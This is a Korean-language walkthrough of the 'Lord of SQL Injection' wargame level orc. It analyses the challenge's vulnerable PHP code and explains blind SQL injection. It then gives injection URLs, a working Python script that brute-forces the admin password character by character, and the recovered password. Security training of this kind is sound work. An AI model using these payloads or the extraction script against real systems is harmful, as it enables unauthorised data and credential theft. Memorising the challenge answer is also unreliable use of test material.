# Lord of SQL Injection No.4 - orc

## 문제 출제 의도

기본적인 Blind SQL Injection을 할 수 있는지 확인한다.

## 소스 코드 분석

orc 문제의 php 소스 코드는 다음과 같다.

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```
-----

```php
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
```
* GET방식으로 pw를 받고, pw에 `prob`, `_`, `.`, `(`, `)` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.

```php
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
```
* 받은 pw가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.

* `$result['id']`에 "0"을 제외한 어떤 값이든 들어 있으면 응답에 "Hello admin" 이라는 문자열이 포함된다.

* 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 pw와 GET방식으로 전달받은 pw가 같음'이다. 즉, 실제 데이터베이스에 저장된 pw를 알아내서 전달해야 한다.

-----

## Blind SQL Injection

4번 orc 문제같은 경우 실제 pw값을 알아내야 한다. 이때 화면에 Hello admin이라는 문자열이 출력되었는지 안 되었는지 여부에 따라 조작한 SQL문의 조건절이 참인지 거짓인지 알아낼 수 있다.

이처럼 SQL Injection이 가능하고 조작한 SQL문의 조건절이 참인지 거짓인지를 구분할 수 있는 경우 원하는 데이터를 한 글자씩 알아낼 수 있는데, 이를 Blind SQL Injection 이라고 한다.

-----

## Solution

1. SUBSTR() 함수 활용

    ```
    http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=' or id='admin' and length(pw)=8-- -
    ```
    ```sql
    select id from prob_orc where id='admin' and pw='' or id='admin' and length(pw)=8-- -'
    ```

    이는 "Hello admin"을 출력하게 만든다. 즉, pw는 8자리임을 알아낸 것이다.

    이와 비슷한 방법으로 쿼리를 조작하면 pw 역시 전부 알아낼 수 있다.

    하지만 이를 반복하여 8자리를 모두 알아내는 것은 사람이 하기 버거우므로 python 코드를 작성하여 풀면 편하다.
    
    ```python
    import urllib.request # python3의 내장 라이브러리인 urllib의 request 모듈을 사용할 수 있도록 이 코드에 불러온다.
    from urllib.parse import quote # python3의 내장 라이브러리인 urllib의 parse 모듈에 들어있는 quote 함수를 사용할 수 있도록 이 코드에 불러온다.

    key = "" # pw값을 저장할 문자열 변수
    for i in range(1, 9): # 8자리임을 알아냈으므로 i에는 1부터 8까지 들어가도록 반복문을 구성
        for j in range(32, 127): # ASCII Code에서 화면에 출력 가능한 문자의 10진수 범위는 32부터 126까지이다.
            url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=" # 공격할 URL에서 변하지 않는 부분이다.
            data = "' or id='admin' and substr(pw, 1, {})='{}'#".format(
                str(i), key + chr(j)) # 반복문을 진행하며 계속 다른 문자가 들어갈 문자열이다.
            print(data) # 반복문이 한 번 돌 때마다 URL을 출력하도록 한다.
            data = quote(data) # URL Encoding을 해 준다.
            re = urllib.request.Request(url + data) # 1행에서 불러온 request 모듈의 Request 클래스를 통해 Request 객체를 만든다.

            re.add_header(
                "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36") # re 객체의 header에 User-agent를 추가한다. User-agent가 없으면 403 Forbidden 오류가 난다. 
            re.add_header(
                "Cookie", "PHPSESSID=jaqm7mrah73p9vvsj7mlp8ec23"
            ) # re 객체의 header에 Cookie로 본인이 로그인한 클라이언트의 PHPSESSID를 추가한다. 이것이 없으면 페이지가 login_chk()에 걸려 그 다음 처리를 하지 않고 <script>location.href='./';</script> 만 응답한다.

            req = urllib.request.urlopen(re) # 객체를 이용해 요청을 보낸다.

            if str(req.read()).find("Hello admin") != -1: # 응답에서 "Hello admin"이라는 문자열을 찾은 경우. find()는 찾으면 시작 인덱스를, 못 찾으면 -1을 반환하는 함수이다.
                key += chr(j).lower() # key 변수 뒤에 ASCII Code로 j값에 해당하는 문자를 붙인다.
                print(key) # key를 출력한다.
                break # i번째 위치의 문자를 찾았으므로 반복문을 탈출한다.
    print(key) # 반복문이 끝나면 최종적으로 찾아낸 8글자 key를 출력한다.
    ```

    이러한 코드를 실행하면 결과값으로 295d5844 를 출력한다.
    이를 GET방식으로 pw의 값으로 전달하면 풀린다.
    
    ```
    http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=295d5844
    ```